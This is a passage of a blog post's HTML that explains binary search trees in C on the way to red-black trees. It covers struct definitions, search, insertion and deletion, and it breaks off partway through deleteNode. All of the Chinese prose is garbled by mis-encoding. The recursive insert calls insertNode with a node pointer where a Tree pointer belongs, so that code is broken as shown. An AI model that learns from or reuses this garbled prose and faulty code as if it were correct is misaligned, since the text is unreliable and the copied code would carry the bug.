çš„è¿‡ç¨‹ä¸­ç¢°åˆ°ä¸å°‘ä½¿ç”¨åˆ°çº¢é»‘æ ‘è¿™ä¸€æ•°æ®ç»“æ„çš„åœ°æ–¹ï¼ˆæ¯”å¦‚è¯´ vmaã€task_structâ€¦ï¼‰ï¼Œæ­¤å‰ä¹Ÿæœªæ·±ç©¶è¿‡è¿™ä¸€æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥ä»Šå¤©æ¥ç®€å•è®²ä¸€è®²å¦‚ä½•ä»é›¶å¼€å§‹æ‰‹æ’•ä¸€æ£µçº¢é»‘æ ‘ï¼›ï¼‰</p><blockquote><p>ä¼šå‚è€ƒã€Šç®—æ³•å¯¼è®ºï¼ˆç¬¬ä¸‰ç‰ˆï¼‰ã€‹ï¼Œ<strong>ä½†æ˜¯ä¸ä¼šç…§æŠ„ä¸Šé¢çš„ä»£ç ï¼Œä¸»è¦è¿˜æ˜¯å€Ÿé‰´æ€è·¯</strong>ï¼›ï¼‰</p><blockquote><p>å½“ç„¶ï¼Œã€Šç®—æ³•å¯¼è®ºã€‹ä¸Šé¢ä¹Ÿåªæœ‰ä¼ªä»£ç </p></blockquote></blockquote><h2 id="Pre-äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰"><a href="#Pre-äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰" class="headerlink" title="Pre.äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰"></a>Pre.äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰</h2><p>è¿™é‡Œè¿˜æ˜¯ç”¨ç¬”è€…æœ€ç†Ÿæ‚‰çš„ C è¯­è¨€æ¥å®šä¹‰ä¸€ä¸ªäºŒå‰æ ‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> key;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸€æ£µæ ‘å®šä¹‰å¦‚ä¸‹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ ¹èŠ‚ç‚¹çš„ wrapperï¼Œä¸è¿‡è¿™æ ·å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬æ›´æ”¹æ ¹èŠ‚ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">root</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-äºŒå‰æœç´¢æ ‘"><a href="#0x01-äºŒå‰æœç´¢æ ‘" class="headerlink" title="0x01. äºŒå‰æœç´¢æ ‘"></a>0x01. äºŒå‰æœç´¢æ ‘</h1><p>æˆ‘ä»¬å…ˆä»äºŒå‰æœç´¢æ ‘çš„åŸºæœ¬æ¦‚å¿µè®²èµ·ï¼Œé¡¾åæ€ä¹‰ï¼Œä¸€æ£µ<strong>äºŒå‰æœç´¢æ ‘</strong>ï¼ˆbinary search treeï¼‰æœ¬è´¨ä¸Šæ˜¯ä¸€æ£µäºŒå‰æ ‘ï¼Œä¸è¿‡å…¶å¤šäº†é¢å¤–çš„æ€§è´¨ï¼š</p><ul><li><em>è®¾ x ä¸ºäºŒå‰æœç´¢æ ‘ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼š</em><ul><li><em>è‹¥ y ä¸º x çš„å·¦å­æ ‘ä¸­çš„ä¸€ä¸ªéç©ºèŠ‚ç‚¹ï¼Œåˆ™æœ‰ <code>y.key &lt;= x.key</code></em></li><li><em>è‹¥ y ä¸º x çš„å³å­æ ‘ä¸­çš„ä¸€ä¸ªéç©ºèŠ‚ç‚¹ï¼Œåˆ™æœ‰ <code>y.key &gt;= x.key</code></em></li></ul></li></ul><p>å³ä¸€ä¸ªèŠ‚ç‚¹çš„å·¦å­æ ‘ä¸­èŠ‚ç‚¹çš„å€¼æ€»å°äºç­‰äºè¯¥èŠ‚ç‚¹ï¼Œå³å­æ ‘ä¸­èŠ‚ç‚¹çš„å€¼æ€»å¤§äºç­‰äºè¯¥èŠ‚ç‚¹ï¼Œè¿™ä¾¿æ˜¯äºŒå‰æœç´¢æ ‘</p><h2 id="æŸ¥æ‰¾èŠ‚ç‚¹"><a href="#æŸ¥æ‰¾èŠ‚ç‚¹" class="headerlink" title="æŸ¥æ‰¾èŠ‚ç‚¹"></a>æŸ¥æ‰¾èŠ‚ç‚¹</h2><blockquote><p>æŸ¥æ‰¾åŸºæœ¬ä¸Šæ²¡æœ‰ä»€ä¹ˆå¥½è®²çš„ç‚¹ï¼Œåé¢æŸ¥æ‰¾åŸºæœ¬ä¸Šä¹Ÿéƒ½æ˜¯è¿™ä¸ªæ€è·¯ï¼Œæ‰€ä»¥è¿™é‡Œè®²å®ŒæŸ¥æ‰¾ä¹‹ååé¢ä¸ä¼šå†é‡å¤å™è¿°</p></blockquote><p>ä¸ºä»€ä¹ˆå«æœç´¢æ ‘å‘¢ï¼Ÿå› ä¸ºæœ‰äº†è¿™ä¸ªæ€§è´¨æˆ‘ä»¬ä¾¿å¾ˆå®¹æ˜“åœ¨æ•´æ£µæ ‘å½“ä¸­å¯»æ‰¾ç‰¹å®šå€¼çš„èŠ‚ç‚¹ï¼Œä¾‹å¦‚ä»æ ¹èŠ‚ç‚¹å¼€å§‹æœç´¢ï¼š</p><h3 id="é€’å½’æŸ¥æ‰¾"><a href="#é€’å½’æŸ¥æ‰¾" class="headerlink" title="é€’å½’æŸ¥æ‰¾"></a>é€’å½’æŸ¥æ‰¾</h3><ul><li>è‹¥å½“å‰èŠ‚ç‚¹ä¸ºç©ºæˆ–å½“å‰èŠ‚ç‚¹çš„å€¼ç­‰äºè¢«æœå¯»å€¼ï¼Œè¿”å›ç»“æœ</li><li>è‹¥å½“å‰èŠ‚ç‚¹çš„å€¼å¤§äºè¢«æœå¯»å€¼ï¼Œæœç´¢å½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘</li><li>è‹¥å½“å‰èŠ‚ç‚¹çš„å€¼å°äºè¢«æœå¯»å€¼ï¼Œæœç´¢å½“å‰èŠ‚ç‚¹çš„å³å­æ ‘</li></ul><p>æœ‰äº†ä»¥ä¸Šç®—æ³•æˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½å†™å‡ºé€’å½’æŸ¥æ‰¾æŸèŠ‚ç‚¹çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">searchNode</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="type">size_t</span> dst_val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root || root-&gt;key == dst_val)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; dst_val)</span><br><span class="line">        <span class="keyword">return</span> searchNode(root-&gt;left, dst_val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> searchNode(root-&gt;right, dst_val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é€’æ¨æŸ¥æ‰¾"><a href="#é€’æ¨æŸ¥æ‰¾" class="headerlink" title="é€’æ¨æŸ¥æ‰¾"></a>é€’æ¨æŸ¥æ‰¾</h3><p>å½“ç„¶ï¼Œè‹¥æ˜¯æ ‘çš„æ·±åº¦å¤ªé«˜ï¼Œé€’å½’å¾ˆå®¹æ˜“çˆ†æ ˆï¼ˆä¾‹å¦‚å†…æ ¸è¿™ç§æ ˆåªæœ‰ä¸€ä¸¤å¼ å†…å­˜é¡µçš„åœºæ™¯ï¼‰ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å°†é€’å½’å˜é€’æ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">searchNode</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="type">size_t</span> dst_val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;key == dst_val)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; dst_val)</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ’å…¥èŠ‚ç‚¹"><a href="#æ’å…¥èŠ‚ç‚¹" class="headerlink" title="æ’å…¥èŠ‚ç‚¹"></a>æ’å…¥èŠ‚ç‚¹</h2><p>æˆ‘ä»¬åœ¨æ’å…¥èŠ‚ç‚¹æ—¶éœ€è¦ä¿è¯äºŒå‰æœç´¢æ ‘ä¾ç„¶æ˜¯äºŒå‰æœç´¢æ ‘ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ’å…¥æ—¶éµå¾ªå¦‚ä¸‹ç®—æ³•ï¼Œä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†ï¼š</p><ul><li>è‹¥å¾…æ’å…¥èŠ‚ç‚¹çš„å€¼å°äºå½“å‰èŠ‚ç‚¹çš„å€¼<ul><li>è‹¥å·¦å­æ ‘ä¸ºç©ºï¼Œåˆ™å¾…æ’å…¥èŠ‚ç‚¹æˆä¸ºå½“å‰èŠ‚ç‚¹çš„å·¦å­©å­</li><li>è‹¥å·¦å­æ ‘éç©ºï¼Œåˆ™ç»§ç»­æ’å…¥åˆ°å·¦å­æ ‘ä¸­</li></ul></li><li>è‹¥å¾…æ’å…¥èŠ‚ç‚¹çš„å€¼å¤§äºå½“å‰èŠ‚ç‚¹çš„å€¼<ul><li>è‹¥å³å­æ ‘ä¸ºç©ºï¼Œåˆ™å¾…æ’å…¥èŠ‚ç‚¹æˆä¸ºå½“å‰èŠ‚ç‚¹çš„å³å­©å­</li><li>è‹¥å³å­æ ‘éç©ºï¼Œåˆ™ç»§ç»­æ’å…¥åˆ°å³å­æ ‘ä¸­</li></ul></li><li>è‹¥å¾…æ’å…¥èŠ‚ç‚¹çš„å€¼ç­‰äºå½“å‰èŠ‚ç‚¹çš„å€¼<ul><li><em>è‡ªå®šä¹‰æ“ä½œ</em></li></ul></li></ul><p>è‹¥å‡ºç°å¾…æ’å…¥èŠ‚ç‚¹çš„å€¼åœ¨è¿™æ£µäºŒå‰æœç´¢æ ‘ä¸­å·²ç»å­˜åœ¨çš„æƒ…å†µï¼ŒäºŒå‰æœç´¢æ ‘å¯¹äºè¿™ç§æƒ…å†µå¹¶æ²¡æœ‰ä¸¥æ ¼çš„å®šä¹‰ï¼Œä½ å¯ä»¥é€‰æ‹©ä¸ºå½“å‰èŠ‚ç‚¹å¢åŠ ä¸€ä¸ª count æˆå‘˜ç„¶å++ï¼Œäº¦æˆ–æ˜¯ä»€ä¹ˆä¹Ÿä¸åš</p><h3 id="é€’å½’æ’å…¥"><a href="#é€’å½’æ’å…¥" class="headerlink" title="é€’å½’æ’å…¥"></a>é€’å½’æ’å…¥</h3><p>è¿™é‡Œæˆ‘ä»¬ä¸ç›´æ¥ç”¨ä¸€ä¸ªèŠ‚ç‚¹æ¥æ’å…¥ï¼Œè€Œæ˜¯é€šè¿‡ä¸€å±‚ wrapper æ¥è¿›è¡Œæ’å…¥ï¼ˆå‚è§ pre éƒ¨åˆ†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NODE_EXISTS -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!tree-&gt;root)</span><br><span class="line">    &#123;</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> insertNodeRecursion(tree-&gt;root, node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNodeRecursion</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *root, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;key &lt; node-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = node;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> insertNode(root-&gt;right, node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;key &gt; node-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = node;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> insertNode(root-&gt;left, node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">        <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é€’æ¨æ’å…¥"><a href="#é€’æ¨æ’å…¥" class="headerlink" title="é€’æ¨æ’å…¥"></a>é€’æ¨æ’å…¥</h3><p>é­”æ”¹çš„ã€Šç®—æ³•å¯¼è®ºã€‹ä¸Šçš„ç®—æ³•ï¼Œé€’æ¨éå†æ‰¾åˆ°å¾…æ’å…¥ä½ç½®ï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ <code>parent</code> èŠ‚ç‚¹å…¶å®å°±æ˜¯ <code>child</code> çš„çˆ¶èŠ‚ç‚¹ï¼Œå½“ root ä¸º NULL æ—¶è¯´æ˜æ‰¾åˆ°äº†å¯æ’å…¥ä½ç½®ï¼Œäºæ˜¯æŠŠå¾…æ’å…¥èŠ‚ç‚¹æ’åˆ° <code>parent</code> ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NODE_EXISTS -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">child</span>;</span></span><br><span class="line">    </span><br><span class="line">    child = tree-&gt;root;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (child)</span><br><span class="line">    &#123;</span><br><span class="line">        parent = child;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;key &lt; child-&gt;key)</span><br><span class="line">            child = child-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &gt; child-&gt;key)</span><br><span class="line">            child = child-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tree is mpty</span></span><br><span class="line">    <span class="keyword">if</span> (!parent)</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &lt; parent-&gt;key)</span><br><span class="line">        parent-&gt;left = node;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;key &gt; parent-&gt;key)</span><br><span class="line">        parent-&gt;right = node;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> NODE_EXISTS;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ é™¤èŠ‚ç‚¹"><a href="#åˆ é™¤èŠ‚ç‚¹" class="headerlink" title="åˆ é™¤èŠ‚ç‚¹"></a>åˆ é™¤èŠ‚ç‚¹</h2><p>æˆ‘ä»¬éœ€è¦åœ¨åˆ é™¤æ‰æŒ‡å®šèŠ‚ç‚¹åä¿æŒè¿™æ£µæ ‘ä»æ˜¯ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå› æ­¤åˆ é™¤èŠ‚ç‚¹æ¯”æ’å…¥èŠ‚ç‚¹è¦ç¨å¾®éº»çƒ¦ä¸€ç‚¹ç‚¹</p><p>åˆ é™¤èŠ‚ç‚¹ä¸»è¦å­˜åœ¨ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><ul><li>å¾…åˆ é™¤èŠ‚ç‚¹ x æ²¡æœ‰å­èŠ‚ç‚¹<ul><li>ç›´æ¥åˆ é™¤ï¼Œçˆ¶èŠ‚ç‚¹å¯¹åº”å­æ ‘ç½®NULL</li></ul></li><li>å¾…åˆ é™¤èŠ‚ç‚¹ x æœ‰ä¸€ä¸ªå­èŠ‚ç‚¹ y<ul><li>è®© y æ›¿ä»£ x åŸæ¥çš„ä½ç½®</li></ul></li><li>å¾…åˆ é™¤èŠ‚ç‚¹ x æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹<ul><li>å¯»æ‰¾ x çš„åç»§èŠ‚ç‚¹ yï¼Œè®© y æ›¿ä»£ x åŸæ¥çš„ä½ç½®ï¼Œx åŸæ¥çš„å·¦å³å­æ ‘æˆä¸º y çš„æ–°çš„å·¦å³å­æ ‘</li></ul></li></ul><blockquote><p>åç»§èŠ‚ç‚¹ï¼šäºŒå‰æ ‘ä¸­åºéå†ä¸­å½“å‰èŠ‚ç‚¹çš„åä¸€ä¸ªèŠ‚ç‚¹</p></blockquote><p>ç¬¬ä¸‰ç§æƒ…å†µæ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬åŒæ—¶è¿˜éœ€è¦è€ƒè™‘åˆ° y çš„ä½ç½®ï¼Œè‹¥ y æ˜¯ x çš„å³å­©å­ï¼Œåˆ™ç›´æ¥è®© y ä¸Šä½æ›¿ä»£ x å³å¯ï¼›è‹¥ y ä¸æ˜¯ x çš„å³å­©å­ï¼Œåˆ™ y ä¸Šä½æ›¿ä»£ x ä¹‹åç”± y çš„å³å­©å­æ›¿ä»£ y çš„åŸä½ç½®ï¼ˆä½œä¸º z çš„åç»§èŠ‚ç‚¹ï¼Œy å¿…å®šæ²¡æœ‰å·¦å­©å­ï¼‰</p><p>åœ¨ã€Šç®—æ³•å¯¼è®ºã€‹ä¸­æœ€ç»ˆå°†è¿™ä¸‰ç§æƒ…å†µæŒ‰å¦‚ä¸‹ç®—æ³•è·¯å¾„è¿›è¡Œå¤„ç†ï¼Œå¯¹äºå¾…åˆ é™¤ç»“ç‚¹ x è€Œè¨€ï¼š</p><ul><li>è‹¥ x æ²¡æœ‰å·¦å­©å­ï¼Œåˆ™ç”¨å…¶å³å­©å­æ¥æ›¿æ¢ xï¼ˆè¿™ä¸ªå³å­©å­å¯ä»¥æ˜¯ NULLï¼Œæ‰€ä»¥å®é™…åŒ…å«ä¸¤ç§æƒ…å†µï¼šä»…æœ‰ä¸€å³å­©|æ— å­ç»“ç‚¹ï¼‰</li><li>è‹¥ x ä»…æœ‰ä¸€ä¸ªå­©å­ä¸”ä¸ºå·¦å­©å­ï¼Œåˆ™ç”¨å…¶å·¦å­©å­æ¥æ›¿æ¢ x</li><li>è‹¥ x åŒæ—¶æœ‰å·¦å³å­©å­ï¼ŒæŸ¥æ‰¾ x çš„åç»§ç»“ç‚¹ yï¼Œå°† y ç§»å‡ºåŸæ¥çš„ä½ç½®è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶æ›¿æ¢æ ‘ä¸­çš„ x<ul><li>è‹¥ y ä¸º x çš„å³å­©å­ï¼Œåˆ™ç›´æ¥ç”¨ y æ›¿æ¢ x</li><li>è‹¥ y ä¸º x çš„å³å­æ ‘ä¸­ç»“ç‚¹ï¼Œå…ˆç”¨ y çš„å³å­©å­æ›¿æ¢ yï¼Œä¹‹åç”¨ y æ›¿æ¢ x</li></ul></li></ul><p><img src="https://s2.loli.net/2022/05/28/IodjvPEy2N1ZJfz.png" alt="ç®—æ³•å¯¼è®ºä¸Šçš„å›¾"></p><p>æœ€åå°±æ˜¯åˆ é™¤æ“ä½œçš„ä»£ç å®ç°äº†ï¼Œè¿™é‡Œæ³¨æ„åç»§èŠ‚ç‚¹çš„ä¸€äº›æ€§è´¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EMPTY_TREE -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">findParent</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">root</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!tree || tree-&gt;root == node)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    root = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == node || root-&gt;right == node)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;key &lt; node-&gt;key)</span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> BinaryTreeNode *<span class="title function_">findSuccessor</span><span class="params">(<span class="keyword">struct</span> BinaryTreeNode *node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor</span>;</span></span><br><span class="line">    </span><br><span class="line">    successor = node-&gt;right;</span><br><span class="line">    <span class="keyword">while</span> (successor &amp;&amp; successor-&gt;left)</span><br><span class="line">        successor = successor-&gt;left;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> successor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> Tree *tree, <span class="keyword">struct</span> BinaryTreeNode *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">successor_parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">dst_parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BinaryTreeNode</span> *<span class="title">replayer</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!tree || !tree-&gt;root)</span><br><span class="line">        <span class="keyword">return</span> EMPTY_TREE;</span><br><span class="line">    </span><br><span class="line">    dst_parent = findParent(tree, dst);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!dst-&gt;left) <span class="comment">// no left child, right to replace x</span></span><br><span class="line">    &#123;</span><br><span class="line">        replayer = dst-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!dst-&gt;right) <span class="comment">// only left child, left to replace x</span></span><br><span class="line">    &#123;</span><br><span class="line">       